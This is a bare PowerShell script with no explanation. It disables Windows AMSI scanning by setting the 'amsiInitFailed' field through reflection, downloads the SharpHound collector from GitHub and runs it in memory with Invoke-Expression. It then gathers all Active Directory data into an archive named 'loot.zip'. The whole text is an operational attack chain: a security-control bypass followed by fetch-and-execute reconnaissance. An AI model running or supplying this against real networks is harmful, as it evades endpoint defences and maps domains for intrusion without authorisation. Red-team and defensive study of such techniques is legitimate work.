$flags = [System.Reflection.BindingFlags] "NonPublic,Static"
$amsi = [System.Management.Automation.AmsiUtils]
$field = $amsi.GetField("amsiInitFailed", $flags)
$field.SetValue($null, $true)
$sharpHoundScript = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
Invoke-Expression $sharpHoundScript.Content
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
